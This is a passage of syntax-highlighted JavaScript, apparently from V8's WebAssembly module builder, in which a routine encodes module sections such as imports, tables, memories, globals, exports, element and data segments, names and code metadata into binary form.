                (is_table64 ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) | (is_shared ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (has_max ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
            section.<span class="hljs-title function_">emit_u8</span>(limits_byte);                 <span class="hljs-comment">// flags</span>
            section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">initial</span>);               <span class="hljs-comment">// initial</span>
            <span class="hljs-keyword">if</span> (has_max) section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">maximum</span>);  <span class="hljs-comment">// maximum</span>
          } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (imp.<span class="hljs-property">kind</span> == kExternalTag) {
            section.<span class="hljs-title function_">emit_u32v</span>(kExceptionAttribute);
            section.<span class="hljs-title function_">emit_u32v</span>(imp.<span class="hljs-property">type_index</span>);
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&#x27;unknown/unsupported import kind &#x27;</span> + imp.<span class="hljs-property">kind</span>);
          }
        }
      });
    }

    <span class="hljs-comment">// Add functions declarations.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting function decls @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kFunctionSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
          section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">type_index</span>);
        }
      });
    }

    <span class="hljs-comment">// Add table section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting tables @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kTableSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">tables</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> table <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">tables</span>) {
          <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_init</span>) {
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x40</span>);  <span class="hljs-comment">// &quot;has initializer&quot;</span>
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x00</span>);  <span class="hljs-comment">// Reserved byte.</span>
          }
          section.<span class="hljs-title function_">emit_type</span>(table.<span class="hljs-property">type</span>);
          <span class="hljs-keyword">let</span> limits_byte = (table.<span class="hljs-property">is_table64</span> ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) |
              (table.<span class="hljs-property">is_shared</span> ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (table.<span class="hljs-property">has_max</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
          section.<span class="hljs-title function_">emit_u8</span>(limits_byte);
          <span class="hljs-keyword">let</span> <span class="hljs-title function_">emit</span> = val =&gt; table.<span class="hljs-property">is_table64</span> ? section.<span class="hljs-title function_">emit_u64v</span>(val) :
                                               section.<span class="hljs-title function_">emit_u32v</span>(val);
          <span class="hljs-title function_">emit</span>(table.<span class="hljs-property">initial_size</span>);
          <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_max</span>) <span class="hljs-title function_">emit</span>(table.<span class="hljs-property">max_size</span>);
          <span class="hljs-keyword">if</span> (table.<span class="hljs-property">has_init</span>) section.<span class="hljs-title function_">emit_init_expr</span>(table.<span class="hljs-property">init_expr</span>);
        }
      });
    }

    <span class="hljs-comment">// Add memory section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting memories @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kMemorySectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">memories</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> memory <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">memories</span>) {
          <span class="hljs-keyword">const</span> has_max = memory.<span class="hljs-property">max</span> !== <span class="hljs-literal">undefined</span>;
          <span class="hljs-keyword">const</span> is_shared = !!memory.<span class="hljs-property">shared</span>;
          <span class="hljs-keyword">const</span> is_memory64 = !!memory.<span class="hljs-property">is_memory64</span>;
          <span class="hljs-keyword">let</span> limits_byte =
              (is_memory64 ? <span class="hljs-number">4</span> : <span class="hljs-number">0</span>) | (is_shared ? <span class="hljs-number">2</span> : <span class="hljs-number">0</span>) | (has_max ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>);
          section.<span class="hljs-title function_">emit_u8</span>(limits_byte);
          <span class="hljs-keyword">let</span> <span class="hljs-title function_">emit</span> = val =&gt;
              is_memory64 ? section.<span class="hljs-title function_">emit_u64v</span>(val) : section.<span class="hljs-title function_">emit_u32v</span>(val);
          <span class="hljs-title function_">emit</span>(memory.<span class="hljs-property">min</span>);
          <span class="hljs-keyword">if</span> (has_max) <span class="hljs-title function_">emit</span>(memory.<span class="hljs-property">max</span>);
        }
      });
    }

    <span class="hljs-comment">// Add tag section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting tags @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kTagSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">tags</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> type_index <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">tags</span>) {
          section.<span class="hljs-title function_">emit_u32v</span>(kExceptionAttribute);
          section.<span class="hljs-title function_">emit_u32v</span>(type_index);
        }
      });
    }

    <span class="hljs-comment">// Add stringref section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">stringrefs</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting stringrefs @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kStringRefSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-number">0</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">stringrefs</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> str <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">stringrefs</span>) {
          section.<span class="hljs-title function_">emit_string</span>(str);
        }
      });
    }

    <span class="hljs-comment">// Add global section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting globals @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kGlobalSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">globals</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> <span class="hljs-variable language_">global</span> <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">globals</span>) {
          section.<span class="hljs-title function_">emit_type</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">type</span>);
          section.<span class="hljs-title function_">emit_u8</span>((<span class="hljs-variable language_">global</span>.<span class="hljs-property">mutable</span> ? <span class="hljs-number">1</span> : <span class="hljs-number">0</span>) | (<span class="hljs-variable language_">global</span>.<span class="hljs-property">shared</span> ? <span class="hljs-number">0b10</span> : <span class="hljs-number">0</span>));
          section.<span class="hljs-title function_">emit_init_expr</span>(<span class="hljs-variable language_">global</span>.<span class="hljs-property">init</span>);
        }
      });
    }

    <span class="hljs-comment">// Add export table.</span>
    <span class="hljs-keyword">var</span> exports_count = wasm.<span class="hljs-property">exports</span>.<span class="hljs-property">length</span>;
    <span class="hljs-keyword">if</span> (exports_count &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting exports @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kExportSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(exports_count);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> exp <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">exports</span>) {
          section.<span class="hljs-title function_">emit_string</span>(exp.<span class="hljs-property">name</span>);
          section.<span class="hljs-title function_">emit_u8</span>(exp.<span class="hljs-property">kind</span>);
          section.<span class="hljs-title function_">emit_u32v</span>(exp.<span class="hljs-property">index</span>);
        }
      });
    }

    <span class="hljs-comment">// Add start function section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">start_index</span> !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting start function @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kStartSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">start_index</span>);
      });
    }

    <span class="hljs-comment">// Add element segments.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">element_segments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting element segments @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kElementSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        <span class="hljs-keyword">var</span> segments = wasm.<span class="hljs-property">element_segments</span>;
        section.<span class="hljs-title function_">emit_u32v</span>(segments.<span class="hljs-property">length</span>);

        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> segment <span class="hljs-keyword">of</span> segments) {
          <span class="hljs-comment">// Emit flag and header.</span>
          <span class="hljs-comment">// Each case below corresponds to a flag from</span>
          <span class="hljs-comment">// https://webassembly.github.io/spec/core/binary/modules.html#element-section</span>
          <span class="hljs-comment">// (not in increasing order).</span>
          <span class="hljs-keyword">let</span> shared_flag = segment.<span class="hljs-property">is_shared</span> ? <span class="hljs-number">0b1000</span> : <span class="hljs-number">0</span>;
          <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">is_active</span>()) {
            <span class="hljs-keyword">if</span> (segment.<span class="hljs-property">table</span> == <span class="hljs-number">0</span> &amp;&amp; segment.<span class="hljs-property">type</span> === <span class="hljs-literal">undefined</span>) {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x04</span> | shared_flag);
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x00</span> | shared_flag)
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
              }
            } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x06</span> | shared_flag);
                section.<span class="hljs-title function_">emit_u32v</span>(segment.<span class="hljs-property">table</span>);
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
                section.<span class="hljs-title function_">emit_type</span>(segment.<span class="hljs-property">type</span>);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x02</span> | shared_flag);
                section.<span class="hljs-title function_">emit_u32v</span>(segment.<span class="hljs-property">table</span>);
                section.<span class="hljs-title function_">emit_init_expr</span>(segment.<span class="hljs-property">offset</span>);
                section.<span class="hljs-title function_">emit_u8</span>(kExternalFunction);
              }
            }
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">is_passive</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x05</span> | shared_flag);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x07</span> | shared_flag);
              }
              section.<span class="hljs-title function_">emit_type</span>(segment.<span class="hljs-property">type</span>);
            } <span class="hljs-keyword">else</span> {
              <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">is_passive</span>()) {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x01</span> | shared_flag);
              } <span class="hljs-keyword">else</span> {
                section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0x03</span> | shared_flag);
              }
              section.<span class="hljs-title function_">emit_u8</span>(kExternalFunction);
            }
          }

          <span class="hljs-comment">// Emit elements.</span>
          section.<span class="hljs-title function_">emit_u32v</span>(segment.<span class="hljs-property">elements</span>.<span class="hljs-property">length</span>);
          <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> element <span class="hljs-keyword">of</span> segment.<span class="hljs-property">elements</span>) {
            <span class="hljs-keyword">if</span> (segment.<span class="hljs-title function_">expressions_as_elements</span>()) {
              section.<span class="hljs-title function_">emit_init_expr</span>(element);
            } <span class="hljs-keyword">else</span> {
              section.<span class="hljs-title function_">emit_u32v</span>(element);
            }
          }
        }
      })
    }

    <span class="hljs-comment">// If there are any passive data segments, add the DataCount section.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-title function_">some</span>(<span class="hljs-function"><span class="hljs-params">seg</span> =&gt;</span> !seg.<span class="hljs-property">is_active</span>)) {
      binary.<span class="hljs-title function_">emit_section</span>(kDataCountSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span>);
      });
    }

    <span class="hljs-comment">// Add function bodies.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-comment">// emit function bodies</span>
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting code @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      <span class="hljs-keyword">let</span> section_length = <span class="hljs-number">0</span>;
      binary.<span class="hljs-title function_">emit_section</span>(kCodeSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">functions</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">let</span> header;
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
          <span class="hljs-keyword">if</span> (func.<span class="hljs-property">locals</span>.<span class="hljs-property">length</span> == <span class="hljs-number">0</span>) {
            <span class="hljs-comment">// Fast path for functions without locals.</span>
            section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">body</span>.<span class="hljs-property">length</span> + <span class="hljs-number">1</span>);
            section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// 0 locals.</span>
          } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// Build the locals declarations in separate buffer first.</span>
            <span class="hljs-keyword">if</span> (!header) header = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Binary</span>;
            header.<span class="hljs-title function_">reset</span>();
            header.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">locals</span>.<span class="hljs-property">length</span>);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> decl <span class="hljs-keyword">of</span> func.<span class="hljs-property">locals</span>) {
              header.<span class="hljs-title function_">emit_u32v</span>(decl.<span class="hljs-property">count</span>);
              header.<span class="hljs-title function_">emit_type</span>(decl.<span class="hljs-property">type</span>);
            }
            section.<span class="hljs-title function_">emit_u32v</span>(header.<span class="hljs-property">length</span> + func.<span class="hljs-property">body</span>.<span class="hljs-property">length</span>);
            section.<span class="hljs-title function_">emit_bytes</span>(header.<span class="hljs-title function_">trunc_buffer</span>());
          }
          <span class="hljs-comment">// Set to section offset for now, will update.</span>
          func.<span class="hljs-property">body_offset</span> = section.<span class="hljs-property">length</span>;
          section.<span class="hljs-title function_">emit_bytes</span>(func.<span class="hljs-property">body</span>);
        }
        section_length = section.<span class="hljs-property">length</span>;
      });
      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
        func.<span class="hljs-property">body_offset</span> += binary.<span class="hljs-property">length</span> - section_length;
      }
    }

    <span class="hljs-comment">// Add data segments.</span>
    <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting data segments @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kDataSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_u32v</span>(wasm.<span class="hljs-property">data_segments</span>.<span class="hljs-property">length</span>);
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> seg <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">data_segments</span>) {
          <span class="hljs-keyword">let</span> shared_flag = seg.<span class="hljs-property">is_shared</span> ? <span class="hljs-number">0b1000</span> : <span class="hljs-number">0</span>;
          <span class="hljs-keyword">if</span> (seg.<span class="hljs-property">is_active</span>) {
            <span class="hljs-keyword">if</span> (seg.<span class="hljs-property">mem_index</span> == <span class="hljs-number">0</span>) {
              section.<span class="hljs-title function_">emit_u8</span>(kActiveNoIndex | shared_flag);
            } <span class="hljs-keyword">else</span> {
              section.<span class="hljs-title function_">emit_u8</span>(kActiveWithIndex | shared_flag);
              section.<span class="hljs-title function_">emit_u32v</span>(seg.<span class="hljs-property">mem_index</span>);
            }
            section.<span class="hljs-title function_">emit_init_expr</span>(seg.<span class="hljs-property">offset</span>);
          } <span class="hljs-keyword">else</span> {
            section.<span class="hljs-title function_">emit_u8</span>(kPassive | shared_flag);
          }
          section.<span class="hljs-title function_">emit_u32v</span>(seg.<span class="hljs-property">data</span>.<span class="hljs-property">length</span>);
          section.<span class="hljs-title function_">emit_bytes</span>(seg.<span class="hljs-property">data</span>);
        }
      });
    }

    <span class="hljs-comment">// Add any explicitly added sections.</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> exp <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">explicit</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting explicit @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_bytes</span>(exp);
    }

    <span class="hljs-comment">// Add names.</span>
    <span class="hljs-keyword">let</span> num_function_names = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">let</span> num_functions_with_local_names = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
      <span class="hljs-keyword">if</span> (func.<span class="hljs-property">name</span> !== <span class="hljs-literal">undefined</span>) ++num_function_names;
      <span class="hljs-keyword">if</span> (func.<span class="hljs-title function_">numLocalNames</span>() &gt; <span class="hljs-number">0</span>) ++num_functions_with_local_names;
    }
    <span class="hljs-keyword">if</span> (num_function_names &gt; <span class="hljs-number">0</span> || num_functions_with_local_names &gt; <span class="hljs-number">0</span> ||
        wasm.<span class="hljs-property">name</span> !== <span class="hljs-literal">undefined</span>) {
      <span class="hljs-keyword">if</span> (debug) <span class="hljs-title function_">print</span>(<span class="hljs-string">&#x27;emitting names @ &#x27;</span> + binary.<span class="hljs-property">length</span>);
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&#x27;name&#x27;</span>);
        <span class="hljs-comment">// Emit module name.</span>
        <span class="hljs-keyword">if</span> (wasm.<span class="hljs-property">name</span> !== <span class="hljs-literal">undefined</span>) {
          section.<span class="hljs-title function_">emit_section</span>(kModuleNameCode, <span class="hljs-function"><span class="hljs-params">name_section</span> =&gt;</span> {
            name_section.<span class="hljs-title function_">emit_string</span>(wasm.<span class="hljs-property">name</span>);
          });
        }
        <span class="hljs-comment">// Emit function names.</span>
        <span class="hljs-keyword">if</span> (num_function_names &gt; <span class="hljs-number">0</span>) {
          section.<span class="hljs-title function_">emit_section</span>(kFunctionNamesCode, <span class="hljs-function"><span class="hljs-params">name_section</span> =&gt;</span> {
            name_section.<span class="hljs-title function_">emit_u32v</span>(num_function_names);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
              <span class="hljs-keyword">if</span> (func.<span class="hljs-property">name</span> === <span class="hljs-literal">undefined</span>) <span class="hljs-keyword">continue</span>;
              name_section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">index</span>);
              name_section.<span class="hljs-title function_">emit_string</span>(func.<span class="hljs-property">name</span>);
            }
          });
        }
        <span class="hljs-comment">// Emit local names.</span>
        <span class="hljs-keyword">if</span> (num_functions_with_local_names &gt; <span class="hljs-number">0</span>) {
          section.<span class="hljs-title function_">emit_section</span>(kLocalNamesCode, <span class="hljs-function"><span class="hljs-params">name_section</span> =&gt;</span> {
            name_section.<span class="hljs-title function_">emit_u32v</span>(num_functions_with_local_names);
            <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> func <span class="hljs-keyword">of</span> wasm.<span class="hljs-property">functions</span>) {
              <span class="hljs-keyword">if</span> (func.<span class="hljs-title function_">numLocalNames</span>() == <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;
              name_section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-property">index</span>);
              name_section.<span class="hljs-title function_">emit_u32v</span>(func.<span class="hljs-title function_">numLocalNames</span>());
              <span class="hljs-keyword">let</span> name_index = <span class="hljs-number">0</span>;
              <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; func.<span class="hljs-property">local_names</span>.<span class="hljs-property">length</span>; ++i) {
                <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> func.<span class="hljs-property">local_names</span>[i] == <span class="hljs-string">&#x27;string&#x27;</span>) {
                  name_section.<span class="hljs-title function_">emit_u32v</span>(name_index);
                  name_section.<span class="hljs-title function_">emit_string</span>(func.<span class="hljs-property">local_names</span>[i]);
                  name_index++;
                } <span class="hljs-keyword">else</span> {
                  name_index += func.<span class="hljs-property">local_names</span>[i];
                }
              }
            }
          });
        }
      });
    }

    <span class="hljs-comment">// Add compilation priorities.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&quot;metadata.code.compilation_priority&quot;</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-property">size</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">compilation_priorities</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">priority, index</span>) =&gt;</span> {
          section.<span class="hljs-title function_">emit_u32v</span>(index);
          section.<span class="hljs-title function_">emit_u8</span>(<span class="hljs-number">0</span>);  <span class="hljs-comment">// Byte offset 0 for function-level hint.</span>
          <span class="hljs-keyword">let</span> compilation_priority =
              <span class="hljs-title function_">wasmUnsignedLeb</span>(priority.<span class="hljs-property">compilation_priority</span>);
          <span class="hljs-keyword">let</span> optimization_priority =
              priority.<span class="hljs-property">optimization_priority</span> != <span class="hljs-literal">undefined</span> ?
              <span class="hljs-title function_">wasmUnsignedLeb</span>(priority.<span class="hljs-property">optimization_priority</span>) :
              [];
          section.<span class="hljs-title function_">emit_u32v</span>(compilation_priority.<span class="hljs-property">length</span> +
                            optimization_priority.<span class="hljs-property">length</span>);
          section.<span class="hljs-title function_">emit_bytes</span>(compilation_priority);
          section.<span class="hljs-title function_">emit_bytes</span>(optimization_priority);
        })
      })
    }

    <span class="hljs-comment">// Add instruction frequencies.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&quot;metadata.code.instr_freq&quot;</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-property">size</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">instruction_frequencies</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">frequencies, index</span>) =&gt;</span> {
          section.<span class="hljs-title function_">emit_u32v</span>(index);
          section.<span class="hljs-title function_">emit_u32v</span>(frequencies.<span class="hljs-property">length</span>);
          frequencies.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">frequency</span> =&gt;</span> {
            section.<span class="hljs-title function_">emit_u32v</span>(frequency.<span class="hljs-property">offset</span>);
            section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// Hint length.</span>
            section.<span class="hljs-title function_">emit_u8</span>(frequency.<span class="hljs-property">frequency</span>);
          })
        })
      })
    }

    <span class="hljs-comment">// Add call targets.</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-property">size</span> &gt; <span class="hljs-number">0</span>) {
      binary.<span class="hljs-title function_">emit_section</span>(kUnknownSectionCode, <span class="hljs-function"><span class="hljs-params">section</span> =&gt;</span> {
        section.<span class="hljs-title function_">emit_string</span>(<span class="hljs-string">&quot;metadata.code.call_targets&quot;</span>);
        section.<span class="hljs-title function_">emit_u32v</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-property">size</span>);
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">call_targets</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">targets, index</span>) =&gt;</span> {
          section.<span class="hljs-title function_">emit_u32v</span>(index);
          section.<span class="hljs-title function_">emit_u32v</span>(targets.<span class="hljs-property">length</span>);
          targets.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">targets_for_offset</span> =&gt;</span> {
            section.<span class="hljs-title function_">emit_u32v</span>(targets_for_offset.<span class="hljs-property">offset</span>);
